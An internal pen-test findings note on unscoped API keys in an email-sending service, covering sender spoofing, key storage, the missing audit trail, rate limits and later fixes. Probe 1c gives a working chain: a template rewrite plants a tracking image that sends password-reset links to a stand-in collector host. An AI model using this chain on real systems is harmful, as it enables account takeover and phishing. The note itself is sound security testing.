# K1: API Keys and their reach

The findings note for scope issue #94 (K1) of [the first pen-test round](../../product-requirements-document/pen-testing.md). It answers H3 and the sending half of H11. It names exploit chains, so **keep it private on the same terms as the PRD**. Probed at commit `d81eaa9`. The probes are `src/pen-test/probes/k1.test.ts`, in the gated run against a real Postgres and Mailpit from [the probe world](../../../src/pen-test/probes/probe-world.ts); each probe that changes a fixture loads the fixtures again when it ends. The `/v1` routes are read from Fastify's own router by `src/pen-test/probes/b1-routes.ts` (shared with B1), not typed by hand. No credential appears here; keys are named by fixture handle (`wizzaroo`, `secondApp`, `deleted`) and rows by fixture id.

## Verdicts

The key powers in probes 1 to 4 are what [ADR 0005](../../architectural-decision-record/0005-templates-and-sending-only.md) and [ADR 0008](../../architectural-decision-record/0008-the-email-platform-is-inside-wizzaroos-trust-boundary.md) describe: keys have no scope, and ADR 0008 says that "stands until the round's findings say otherwise", with no other Application given a key before both rounds close. So each is confirmed as a documented decision whose end is recorded as a condition (the second-Application gate), not a date; ADR 0008 does not accept them, so each is still proposed as a finding.

Every power in probe 1 was tried with `secondApp`. The `wizzaroo` key has exactly the same powers over the second app's Template and Messages, because nothing in the code tells keys apart (`src/api/http-server.ts:171-182` authenticates and throws the row away).

## The key powers (probe 1)

One `onRequest` hook guards `/v1` (`src/api/http-server.ts:171-182`). It calls `authenticateApiKey` and discards the row it returns; no route sees which key called it, so no route can scope by key. `api_keys` has no Application, owner or scope column (`src/lib/schema.ts:47-54`).

### Any `from` (1a, 1b)

- Sent: `POST /v1/messages` with `secondApp`, `from: "Wizzaroo <no-reply@wizzaroo.adrianeyre.co.uk>"` (the Wizzaroo Configuration's own name and address), one `.invalid` recipient, a subject and text.
- Came back: `202`, the summary's `from` exactly as sent. The send worker, run once through Mailpit, answered `sent`, and Mailpit's copy is `From: Wizzaroo <no-reply@wizzaroo.adrianeyre.co.uk>`.
- The same with `from: "Chief Executive <ceo@bank.pen-test.invalid>"`, an address no Configuration or Setting names: `202`, delivered from `ceo@bank.pen-test.invalid`.
- Why: the body's `from` is a free string of 3-320 characters (`src/sending/message-routes.ts:20-27`) and wins over the Template's Configuration and the default (`src/sending/accept-message.ts:219-223`). In production the only bound is what the SMTP provider will relay for its credentials; with a provider verified for the whole sending domain, every key can send as every sender on it, Wizzaroo's account emails included. The display name and header injection are S1's ([see S1](S1.md)); this note owns only that a key may name any sender.

### Rewriting Wizzaroo's reset Template (1c)

- Sent: `PUT /v1/templates/7e570000-0000-4000-8000-000500000002` (`wizzaroo-reset-your-password`) with `secondApp`, the fixture Template's own fields (name, slug, subject, variables, sample variables, Header, Footer, Configuration), `design: null`, and its HTML with one line added before `</body>`: a 1×1 image whose `src` is `https://collector.pen-test.invalid/c?l={{resetUrl}}`.
- Came back: `200` and the replaced row. `checkTemplate` only checks that the Template renders with its sample variables (`src/templates/template-routes.ts:159-174`); the `PUT` itself is `src/templates/template-routes.ts:284-319`.
- Then `wizzaroo` sent the reset email by `templateSlug`, with a `resetUrl` carrying a probe token: `202`. The stored HTML holds `https://collector.pen-test.invalid/c?l=https://wizzaroo.pen-test.invalid/reset?token&#x3D;<probe token>` (Handlebars escapes the link's `=`, which a mail client undoes before it fetches the image), and the mail Mailpit received holds it too. So the next reset email every parent opens hands their working reset link to a server the key's holder chose, and the email still looks and works exactly as before.
- Wider still, with the same key: `PUT /v1/headers/<the Wizzaroo Header>` replaces the Header all 15 Built-in Templates use, and "Every Template using this header sends with the new one straight away" (`src/templates/part-routes.ts:208-240`). One request plants the same image in every Wizzaroo account email (reset, Invite, email check, passkey notices). Not run as a separate probe: it is the same route and the same missing check as 1d.
- This is the H3 chain the PRD feared. By the Findings workflow table it is critical ("a Wizzaroo account link reaches anyone but its addressee"), though it needs a key: today only Wizzaroo holds one in production, and ADR 0008 stops any other Application getting one before both rounds close. A leaked Wizzaroo key does the same.

### Deleting the Header (1d)

- Before: 15 Templates have `header_id` = the fixture Header (`7e570000-0000-4000-8000-000300000001`).
- Sent: `DELETE /v1/headers/<that id>` with `secondApp`. Came back: `200 {}`.
- After: none do. The foreign key is `on delete set null` (`src/lib/schema.ts:128-131`), so `GET /v1/templates/<reset id>` shows `headerId: null`, and every Wizzaroo email is sent without its Header from then on, with no error and no notice to anyone. The route is `src/templates/part-routes.ts:242-264`.

### Reading a Wizzaroo Message (1e)

- Sent: `GET /v1/messages/<id of the Wizzaroo reset Message, 7e570000-0000-4000-8000-000600000002>` with `secondApp`.
- Came back: `200` with the parent's address in `to`, the subject, `from`, status, provider message id, `error` and attempts (`src/sending/message-routes.ts:127-138`, `summariseMessage` at `:73-88`). The `/v1` answer carries no body, so the reset link is not in it; who can read the stored body is D2's ([see D2](D2.md)).
- Ids are random v4 UUIDs, so a key has to be given or learn an id; there is no `/v1` list. One way to learn one is an Idempotency-Key collision, which is S2's ([see S2](S2.md)). The point here is that nothing ties a Message to the key that sent it, so nothing could refuse it (probe 4).

## The deleted key (probe 2)

- `deleted` has no row (E2 removes it; its secret is still derived). On all 25 `/v1` routes (the router's own list: `POST /v1/messages`, `GET`/`HEAD /v1/messages/:id`, and `GET`/`HEAD`/`POST`/`PUT`/`DELETE` across `/v1/templates`, `/v1/templates/preview`, `/v1/headers`, `/v1/footers` and their `:id`s), each with a JSON-array body where it takes one: `401 {"error":"unauthenticated","message":"The API key is not valid"}` every time (`HEAD` with no body).
- Straight after a delete: `victim` made a key at `POST /app/api-keys`, it answered `GET /v1/templates` with `200`, `victim` deleted it at `DELETE /app/api-keys/:id` (`200`), and every `/v1` route then answered `401`. `authenticateApiKey` reads the row on every request (`src/access/api-keys.ts:73-99`); nothing caches a key.
- Messages a key queued before it was deleted are still sent: nothing links them to it (probe 4). That is what a delete means here; it is worth knowing when a key leaks.

## Entropy, storage, comparison and display (probe 3)

- **Entropy.** `createApiKey` makes `ek_<lookup id>_<secret>`: the lookup id is 8 random bytes in hex, the secret `generateSecret()`'s 24 random bytes in base64url (`src/access/api-keys.ts:40-41`, `src/lib/secrets.ts:19-20`). The probe decoded both from a new key: 8 and 24 bytes. 192 random bits is far beyond any guess; the lookup id is shown in the list and need not be secret.
- **Storage.** `api_keys.secret_hash` is the SHA-256 hex of the whole token (`src/access/api-keys.ts:44`, `src/lib/secrets.ts:22-23`); the probe recomputed it, and the row holds nothing else of the secret. An unsalted fast hash is right for a 192-bit random secret: there is no dictionary to try.
- **Comparison.** The token must match `^Bearer\s+(\S+)$` and `^ek_([0-9a-f]{16})_(.+)$`; the row is found by lookup id, then the digests are compared with `timingSafeEqual` after a length check (`src/access/api-keys.ts:77-92`, `src/lib/secrets.ts:25-32`). A real lookup id with a wrong secret, an unknown lookup id, the real key with a character added, and the real key in capitals all answered the same `401` body, 64 bytes each. The only difference between a known and an unknown lookup id is one SHA-256 and one compare, microseconds, and a lookup id is 64 random bits, so there is nothing to enumerate.
- **Display.** `POST /app/api-keys` answers `201` with the secret once. `GET /app/api-keys` gives each key's `id`, `name`, `prefix` (`ek_<lookup id>_…`), `lastUsedAt` and `createdAt` and nothing else (`summariseApiKey`, `src/access/api-keys.ts:20-26`); neither the secret nor its hash is in it. `pnpm cli apikey:create <name>` prints `Created API key "<name>". Store it now; it is not shown again:` and the key on the next line (`src/access/cli.ts:53-56`), and the list then shows only its prefix. The guide says the same (`docs/guide/delivery-and-access.md`, Access).

## What is recorded (probe 4)

- `messages` has 17 columns: `id`, `created_at`, `template_id`, `from`, `to`, `cc`, `bcc`, `reply_to`, `subject`, `html`, `text`, `status`, `provider_message_id`, `error`, `attempts`, `sent_at`, `idempotency_key` (`src/lib/schema.ts:147-172`). None names a key. `templates` and `email_parts` have `created_at` and `updated_at` but no column naming a key or a User. The database has nine tables and none is an audit log.
- The same send from `wizzaroo` and from `secondApp` came back with summaries that differ only in `id` and `createdAt`.
- The only trace a key leaves is its own `api_keys.last_used_at`: which key was used last, not what it did. The request log (`isLogging: true` in production, `src/index.ts:66`) records method, URL and remote address per request, not the key.
- So after 1c, nobody can say which key rewrote the reset Template or when (beyond `updated_at`), or which Messages a leaked key sent before it was deleted. Who created a User or an API Key is A2's ([see A2](A2.md)).

## Send rate and `last_used_at` (probe 5, arithmetic)

Nothing limits `/v1`: no rate-limit plugin is a dependency or registered (`package.json`, `src/api/http-server.ts`), and 20 sends in a row from `secondApp` all answered `202` with no `RateLimit-*` or `X-RateLimit-*` header. Volume was not tested; the rest is arithmetic.

- **Intake.** The 20 sends took 57 ms in-process (`inject`, no network or TLS), **2.9 ms each**, so one caller sending one at a time gets about **345 Messages a second**. Each is up to 50 `to`, 50 `cc` and 50 `bcc` (`src/sending/message-routes.ts:28-30`), **150 recipients**, so about **51,700 recipient addresses a second**, 186 million an hour, from one key over one connection. Callers in parallel are bounded by `pg`'s default pool of 10 connections (`src/lib/database.ts`, no `max` set), and by each send's row lock on its key (below). Each Message may be up to 25 MB of body and attachments (`accept-message.ts:233-244`) in a 36 MB request (`http-server.ts:50`), all stored in Postgres until it is sent.
- **Delivery.** One `send-message` worker fetches one job at a time (`batchSize: 1`, `src/index.ts:83-86`) and, with pg-boss 12's defaults, polls every 2 s when it isn't woken sooner. At that floor it delivers 1,800 Messages an hour. Every key's Messages share that one queue, first in first out, so one minute of a second key's intake (about 20,700 Messages) is about 11.5 hours of the worker's time at that floor, and every Wizzaroo reset and Invite queued behind it waits. At any rate, the burst spends the SMTP provider's quota and the sending domain's reputation, which are Wizzaroo's too.
- **`last_used_at`.** `authenticateApiKey` runs `UPDATE api_keys SET last_used_at = now() WHERE id = …` on every authenticated call (`src/access/api-keys.ts:94-97`), reads included: the probe saw it move after `GET /v1/templates` and again after `GET /v1/messages/:id`, and stay put after a refused key. So writes = authenticated calls: 345 a second at the rate above, every one on the same row. Each is a new row version for autovacuum to clear (it is a HOT update, `last_used_at` having no index), and concurrent calls with one key queue for that row's lock. A refused key writes nothing, so a bad key can't be used to load it.
- The figures belong to [the request-rate pre-condition](../../product-requirements-document/pen-testing.md#pre-condition-the-request-rate-policy-before-the-gate), which sets none yet. The API-wide limit and `POST /v1/templates/preview`'s render cost are I2a's and S3's (scope issue I2a, #103, and [see S3](S3.md)); this note proposes only the per-key send limit.

## Checks every scope issue carries

Applied:

- **Refusals give nothing away.** Applied to keys: a known lookup id with a wrong secret and an unknown one get the same status, body and length (3c). With no key at all the body differs ("Send an API key as a Bearer token…") but says nothing about any key. Held.
- **Every refusal comes from a closed set.** Every `/v1` route refused the deleted key with one body, and no probe here met a 5xx. Held for this surface; the error handler as a whole is I1's.
- **Nothing is left to a collaborator to bound.** Applied to sending: recipients per call are bounded (150), but calls per key are not, and the SMTP provider is the only limit on volume. Failed: probe 5.
- **A secret is sealed or hashed where it is kept, and kept no longer than it is needed.** Applied to API Keys: hashed, shown once (probe 3). Held. Wizzaroo's links in stored bodies are D2's.
- **Run the probes against a real Postgres.** Every probe here does, and delivers through a real Mailpit where delivery matters.
- **A test that passes either way proves nothing.** Every `it.fails` here was run as a plain `it` and fails on its property assertion (a `202`, `200` or missing column where a refusal or a column should be), not on setup.

Not applied, and why:

- **An idempotency key is bound to its payload and its owner.** S2 owns it ([see S2](S2.md)); probe 1e notes where it meets K1.
- **Odd input stops above the database.** S1 owns the send body's odd input; nothing on the key path takes input beyond the `Authorization` header, which is matched by a regular expression before any query.
- **Logs are a copy of the data.** D2 owns the log sweep. This note checked only that the request log names no key (probe 4).
- **Internal headers are trusted only when the server set them.** No key path reads a header other than `Authorization`. `X-Forwarded-For` is A1's.
- **Middleware that matches by path matches by segment.** B1 owns it ([see B1](B1.md)): the key hook belongs to the `/v1` route scope, not to a path match.
- **Configuration fails closed.** No key setting is configuration.

## Since the probe

#113, #117 and #118 are fixed in the second round's pull request (fixed, unverified): every API Key belongs to an Application ([ADR 0009](../../architectural-decision-record/0009-api-keys-belong-to-an-application.md)). Their `today_` tests are now `(regression)` tests, and their `it.fails` are plain `it`s, in `src/pen-test/probes/k1.test.ts`. A Message now records its key, but a change to a Template, Header or Footer still records none, so #132 stays open.

#132 is fixed in the third round (fixed, unverified). Each Template, Header and Footer records the API Key (`updated_by_api_key_id`) or the User (`updated_by_user_id`) that last made or replaced it (migration `0008_record_who_made_and_changed`); the CLI's built-ins record neither. Two columns were chosen over an append-only audit table as the smaller change that answers "which key last changed this": they keep only the last change, not the history. They are bare IDs with no foreign key, so the record outlives the key being revoked, which is when it is needed (`messages.api_key_id` still clears when its key is deleted). The `/v1` request log now names the key (`apiKeyId`, a child-logger binding in `src/api/http-server.ts`). Turned in `src/pen-test/probes/k1.test.ts`: `each Message, Template, Header and Footer records the API Key that sent or last changed it` is a plain `it`, and its `today_` test is now `(regression) a Message records the key that sent it, and a Template, Header or Footer the key or User that last changed it (#132)`.

#133 is fixed in the third round (fixed, unverified), with the request-rate policy's per-key figure for `POST /v1/messages`: recipient addresses (`to`, `cc` and `bcc` together) a minute per API Key, across the deployment. The count is a fixed one-minute window on the key's row (`api_keys.send_window_started_at`, `api_keys.send_window_recipients`), checked and counted by one `UPDATE … RETURNING` in the transaction that stores the Message (`src/sending/send-limit.ts`), so two `api` processes can't both take the last of it, and a refused or failed send counts nothing. Every counted send reports `RateLimit-Limit`, `RateLimit-Remaining` and `RateLimit-Reset`; a send that doesn't fit is `429` with `Retry-After` and one body, `too_many_requests` (`TooManyRequestsError` in `src/lib/http.ts`, for every limit to share). A single Message with more recipients than the whole limit is `422`, since waiting would never let it through. A fixed window lets a key send up to twice the figure across a window's edge, the PRD's per-key burst. The figure is a code constant (`recipientsPerKeyPerMinute`), not configuration, and tests read it rather than copy it. `last_used_at` is now written at most once a minute (`src/access/api-keys.ts`). In `src/pen-test/probes/k1.test.ts`, `a key's sends are counted against a limit the response reports` is a plain `it`, and its `today_` test is `(regression) … (#133)`. I2a's send pair turned with it (see I2a's note). The other `/v1` limits (#162) are not built.
